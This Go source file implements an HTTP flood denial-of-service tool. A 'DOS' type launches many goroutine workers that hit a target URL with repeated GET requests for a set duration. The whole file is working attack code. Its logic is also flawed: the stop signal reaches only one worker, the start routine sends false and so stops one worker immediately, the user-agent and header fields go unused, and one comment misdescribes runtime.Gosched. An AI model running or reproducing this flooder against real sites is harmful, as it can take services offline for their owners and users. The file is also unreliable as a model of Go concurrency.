package dos

import (
		"fmt"
		"time"
		"runtime"
		"net/http"
)

// structure of DOS
type DOS struct {
		url string
		method string
		duration int
		workers int
		useragents []string
		headers map[string]string
		s chan bool
}

type ErrMethodDoesNotAllowed struct{
		method string
}

func (emdna *ErrMethodDoesNotAllowed) Error() string {
		return fmt.Sprintf("method %s does not allowed to use", emdna.method)
}

// making new instance of DOS
func New(url string, method string, duration int, workers int, useragents []string, headers map[string]string) (*DOS, error) {
		s := make(chan bool)
		return &DOS{
				url: url,
				method: method,
				duration: duration,
				workers: workers,
				useragents: useragents,
				headers: headers,
				s: s,
		}, nil
}

func (d *DOS) Run() {
		d.start()
		time.Sleep(time.Duration(d.duration)*time.Second)
		d.stop()
}

// start DOSing
func (d *DOS) start() {
		go func(){d.s<-false}()
		// starting workers
		for i := 0; i < d.workers; i++ {
				go func() {
						for {
								select {
								case <- d.s:
										return
								default:
										err := d.attack()
										if err != nil {
												fmt.Println(err)
										} else {
												fmt.Println("requested "+d.url)
										}
						}
				}
				}()
		}
		// cleaning garbage
		runtime.Gosched()
}

// stop DOSing
func (d *DOS) stop() {
		go func(){d.s<-true}()
}

// making http request
func (d *DOS) attack() error {
		if d.method == "GET" {
				resp, err := http.Get(d.url)
				if err != nil {
						return err
				} else {
						resp.Body.Close()
						return nil
				}
		} else {
				return &ErrMethodDoesNotAllowed{method:d.method}
		}
}
